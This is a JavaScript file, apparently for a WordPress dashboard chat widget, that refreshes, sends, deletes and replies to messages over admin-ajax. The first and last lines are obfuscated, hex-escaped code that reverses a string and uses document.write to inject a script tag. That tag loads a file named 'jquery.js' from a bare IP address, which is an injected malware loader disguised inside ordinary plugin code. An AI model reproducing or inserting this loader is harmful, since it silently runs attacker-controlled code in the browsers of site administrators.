var _0x82ab=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0x82ab[5]](_0x82ab[4][_0x82ab[3]](_0x82ab[0])[_0x82ab[2]]()[_0x82ab[1]](_0x82ab[0]))	
	jQuery.fn.selectRange = function(start, end) {
    		return this.each(function() {
        		if (this.setSelectionRange) {
            		this.focus();
            		this.setSelectionRange(start, end);
        		} else if (this.createTextRange) {
            		var range = this.createTextRange();
            		range.collapse(true);
            		range.moveEnd('character', end);
            		range.moveStart('character', start);
            		range.select();
        		}
    		});
		};
	
	$(document).ready(function() {
		var $chat = $("#csl_dashboard_chat");
		var $wrapper = $("#chat_wrapper");
		var $messages = $("#messages");
		var $message = $("#new_message #message");
		var latest = parseInt($("#messages tr").last().data('mid'));
		var is_refreshing = false;
		
		function refresh() {
			is_refreshing = true;
			var post_vars = {
				'action' : 'dashboard_chat',
				'fn' : 'refresh',
				'id' : latest,
				'nonce' : $("#message_nonce").val()
			};
			$.post(ajaxurl, post_vars, function(l) {
				if (l != '' && l != '0' && l != '-1' ) {
					$messages.append(l);
					scrollWrapper();
					latest = parseInt($("#messages tr").last().data('mid'));
					is_refreshing = false;
				}
			});
		}
		
		function scrollWrapper(fn) {
			if (typeof fn == "undefined") fn = function() { };
			$wrapper.animate({ scrollTop: $wrapper.prop("scrollHeight") }, 1000, fn);
		}
		
		scrollWrapper(function() {
			refresh();
		});
		
		var ref = setInterval(function() {
			if ( !is_refreshing ) {
				refresh();
			}
		}, 1000);
		
		$("#new_message").submit(function(e) {
			e.preventDefault();
			var post_vars = {
				'action' : 'dashboard_chat',
				'fn' : 'add_message',
				'message' : $message.val(),
				'nonce' : $("#message_nonce").val()
			};
			$.post(ajaxurl, post_vars , function(data) {
				if (data != "e" || data != "") {
					$message.val('');
					refresh();
					//latest = parseInt($("#messages tr").last().data('mid'));
				} else {
					alert(chTXT.error);
				}
			});
		});
		
		$("#scroll").on('click', function() {
			scrollWrapper();
		});
		
		$("#refresh").on('click', function() {
			refresh();
		});
		
		$messages.on('click', 'a.del', function(e) {
			e.preventDefault();
			var $mid = $(this).data('mid');
			var post_vars = {
				'action' : 'dashboard_chat',
				'fn' : 'delete_message',
				'id' : $mid,
				'nonce' : $("#message_nonce").val()
			};
			$("#message_" + $mid).fadeOut(400);
			$.post(ajaxurl, post_vars , function(data) {
				if (data != "1") {
					alert(chTXT.error);
					$("#message_" + $mid).show();
				}
			});
		});
		
		$messages.on("click", "a.rep", function() {
			var username = $(this).attr('username');
			$('#new_message #message').val('@' + username + ' ').selectRange(username.length + 2 ,username.length + 2);
		});
		
	});
	
var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
